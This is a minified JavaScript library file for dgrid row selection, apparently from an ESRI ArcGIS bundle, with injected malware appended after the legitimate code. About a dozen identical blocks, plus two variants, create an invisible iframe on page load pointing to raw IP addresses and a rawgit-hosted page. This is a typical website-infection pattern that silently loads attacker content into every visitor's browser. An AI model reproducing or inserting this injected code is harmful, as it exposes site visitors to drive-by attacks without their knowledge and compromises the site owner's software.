// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define("dojo/_base/kernel dojo/_base/declare dojo/_base/Deferred dojo/on dojo/has dojo/aspect dgrid/List dojo/has!touch?dgrid/util/touch put-selector/put dojo/query dojo/_base/sniff".split(" "),function(w,x,y,f,d,k,g,p,q){function r(a,b){b=a.unselectable=b?"on":"";a=a.getElementsByTagName("*");for(var c=a.length;--c;)"INPUT"!==a[c].tagName&&"TEXTAREA"!==a[c].tagName&&(a[c].unselectable=b)}function t(a,b){var c=a.bodyNode,e=b?"text":21>d("ff")?"-moz-none":"none";l&&"msUserSelect"!==l?c.style[l]=e:
d("dom-selectstart")?b||a._selectstartHandle?b&&a._selectstartHandle&&(a._selectstartHandle.remove(),delete a._selectstartHandle):a._selectstartHandle=f(c,"selectstart",function(a){var b=a.target&&a.target.tagName;"INPUT"!==b&&"TEXTAREA"!==b&&a.preventDefault()}):(r(c,!b),b||a._unselectableHandle)?b&&a._unselectableHandle&&(a._unselectableHandle.remove(),delete a._unselectableHandle):a._unselectableHandle=k.after(a,"renderRow",function(a){r(a,!0);return a})}d.add("dom-comparedocumentposition",function(a,
b,c){return!!c.compareDocumentPosition});d.add("pointer",function(a){return"PointerEvent"in a?"pointer":"MSPointerEvent"in a?"MSPointer":!1});d.add("css-user-select",function(a,b,c){a=c.style;b=["Khtml","O","ms","Moz","Webkit"];c=b.length;var e="userSelect";do if("undefined"!==typeof a[e])return e;while(c--&&(e=b[c]+"UserSelect"));return!1});d.add("dom-selectstart","undefined"!==typeof document.onselectstart);var m=d("mac")?"metaKey":"ctrlKey",l=d("css-user-select"),u=(g=d("pointer"))&&"MS"===g.slice(0,
2),v=g?g+(u?"Down":"down"):"mousedown",n=g?g+(u?"Up":"up"):"mouseup";"WebkitUserSelect"===l&&"undefined"!==typeof document.documentElement.style.msUserSelect&&(l=!1);return x("dgrid.Selection",null,{selectionDelegate:".dgrid-cell.dgrid-cell-padding.dgrid-column-selectionHandle.field-selectionHandle.selection-handle-column",selectionEvents:v+","+n+",dgrid-cellfocusin",selectionTouchEvents:d("touch")?p.tap:null,deselectOnRefresh:!0,allowSelectAll:!1,selection:{},selectionMode:"extended",allowTextSelection:void 0,
_selectionTargetType:"rows",create:function(){this.selection={};return this.inherited(arguments)},postCreate:function(){this.inherited(arguments);this._initSelectionEvents();var a=this.selectionMode;this.selectionMode="";this._setSelectionMode(a)},destroy:function(){this.inherited(arguments);this._selectstartHandle&&this._selectstartHandle.remove();this._unselectableHandle&&this._unselectableHandle.remove();this._removeDeselectSignals&&this._removeDeselectSignals()},_setSelectionMode:function(a){a!=
this.selectionMode&&(this.clearSelection(),this.selectionMode=a,this._selectionHandlerName="_"+a+"SelectionHandler",this._setAllowTextSelection(this.allowTextSelection))},setSelectionMode:function(a){w.deprecated("setSelectionMode(...)",'use set("selectionMode", ...) instead',"dgrid 0.4");this.set("selectionMode",a)},_setAllowTextSelection:function(a){"undefined"!==typeof a?t(this,a):t(this,"none"===this.selectionMode);this.allowTextSelection=a},_handleSelect:function(a,b){if(this[this._selectionHandlerName]&&
this.allowSelect(this.row(b))&&("dgrid-cellfocusin"!==a.type||"mousedown"!==a.parentType)&&(a.type!==n||b==this._waitForMouseUp)){this._waitForMouseUp=null;this._selectionTriggerEvent=a;if(!a.keyCode||!a.ctrlKey||32==a.keyCode)if(!a.shiftKey&&a.type===v&&this.isSelected(b))this._waitForMouseUp=b;else this[this._selectionHandlerName](a,b);this._selectionTriggerEvent=null}},_singleSelectionHandler:function(a,b){a=a.keyCode?a.ctrlKey:a[m];this._lastSelected===b?this.select(b,null,!a||!this.isSelected(b)):
(this.clearSelection(),this.select(b),this._lastSelected=b)},_multipleSelectionHandler:function(a,b){var c=this._lastSelected,e=a.keyCode?a.ctrlKey:a[m],h;a.shiftKey||(h=e?null:!0,c=null);this.select(b,c,h);c||(this._lastSelected=b)},_extendedSelectionHandler:function(a,b){(2===a.button?this.isSelected(b):a.keyCode?a.ctrlKey:a[m])||this.clearSelection(null,!0);this._multipleSelectionHandler(a,b)},_toggleSelectionHandler:function(a,b){this.select(b,null,null)},_initSelectionEvents:function(){var a=
this,b=this.contentNode,c=this.selectionDelegate;this._selectionEventQueues={deselect:[],select:[]};d("touch")&&!d("pointer")&&this.selectionTouchEvents?(f(b,p.selector(c,this.selectionTouchEvents),function(b){a._handleSelect(b,this);a._ignoreMouseSelect=this}),f(b,f.selector(c,this.selectionEvents),function(b){a._ignoreMouseSelect!==this?a._handleSelect(b,this):b.type===n&&(a._ignoreMouseSelect=null)})):f(b,f.selector(c,this.selectionEvents),function(b){a._handleSelect(b,this)});this.addKeyHandler&&
this.addKeyHandler(32,function(b){a._handleSelect(b,b.target)});if(this.allowSelectAll)this.on("keydown",function(b){b[m]&&65==b.keyCode&&!/\bdgrid-input\b/.test(b.target.className)&&(b.preventDefault(),a[a.allSelected?"clearSelection":"selectAll"]())});this._setStore&&k.after(this,"_setStore",function(){a._updateDeselectionAspect()});this._updateDeselectionAspect()},_updateDeselectionAspect:function(){function a(a,c,e){a=c||a&&a[b.idProperty||"id"];if(null!=a&&(c=(a=b.row(a))&&b.selection[a.id]))b[e](a,
null,c)}var b=this,c=this.store,e,h;this._removeDeselectSignals&&this._removeDeselectSignals();c&&c.notify?(e=k.before(c,"notify",function(b,c){b||a(b,c,"deselect")}),h=k.after(c,"notify",function(b,c){a(b,c,"select")},!0),this._removeDeselectSignals=function(){e.remove();h.remove()}):(e=k.before(this,"removeRow",function(a,b){b||(a=this.row(a))&&a.id in this.selection&&this.deselect(a)}),this._removeDeselectSignals=function(){e.remove()})},allowSelect:function(a){return!0},_fireSelectionEvent:function(a){var b=
this._selectionEventQueues[a],c=this._selectionTriggerEvent,e;e={bubbles:!0,grid:this};c&&(e.parentType=c.type);e[this._selectionTargetType]=b;this._selectionEventQueues[a]=[];f.emit(this.contentNode,"dgrid-"+a,e)},_fireSelectionEvents:function(){var a=this._selectionEventQueues,b;for(b in a)a[b].length&&this._fireSelectionEvent(b)},_select:function(a,b,c){var e,h,d;"undefined"===typeof c&&(c=!0);a.element||(a=this.row(a));if(!1===c||this.allowSelect(a))if(e=this.selection,h=!!e[a.id],null===c&&(c=
!h),d=a.element,c||this.allSelected?e[a.id]=c:delete this.selection[a.id],d&&(c?q(d,".dgrid-selected"+(this.addUiClasses?".ui-state-active":"")):q(d,"!dgrid-selected!ui-state-active")),c!==h&&d&&this._selectionEventQueues[(c?"":"de")+"select"].push(a),b)if(b.element||(b=this.row(b)),b){if(b=b.element)for(e=this._determineSelectionDirection(d,b),e||(b=document.getElementById(b.id),e=this._determineSelectionDirection(d,b));a.element!=b&&(a=this[e](a));)this._select(a,null,c)}else this._lastSelected=
d,console.warn("The selection range has been reset because the beginning of the selection is no longer in the DOM. If you are using OnDemandList, you may wish to increase farOffRemoval to avoid this, but note that keeping more nodes in the DOM may impact performance.")},_determineSelectionDirection:d("dom-comparedocumentposition")?function(a,b){a=b.compareDocumentPosition(a);return a&1?!1:2===a?"down":"up"}:function(a,b){return 1>b.sourceIndex?!1:b.sourceIndex>a.sourceIndex?"down":"up"},select:function(a,
b,c){this._select(a,b,c);this._fireSelectionEvents()},deselect:function(a,b){this.select(a,b,!1)},clearSelection:function(a,b){this.allSelected=!1;for(var c in this.selection)a!==c&&this._select(c,null,!1);b||(this._lastSelected=null);this._fireSelectionEvents()},selectAll:function(){this.allSelected=!0;this.selection={};for(var a in this._rowIdToObject){var b=this.row(this._rowIdToObject[a]);this._select(b.id,null,!0)}this._fireSelectionEvents()},isSelected:function(a){if("undefined"===typeof a||
null===a)return!1;a.element||(a=this.row(a));return a.id in this.selection?!!this.selection[a.id]:this.allSelected&&(!a.data||this.allowSelect(a))},refresh:function(){this.deselectOnRefresh&&this.clearSelection();this._lastSelected=null;return this.inherited(arguments)},renderArray:function(){var a=this,b=this.inherited(arguments);y.when(b,function(b){var c=a.selection,d,f,g;for(d=0;d<b.length;d++)f=a.row(b[d]),(g=f.id in c?c[f.id]:a.allSelected)&&a._select(f,null,g);a._fireSelectionEvents()});return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});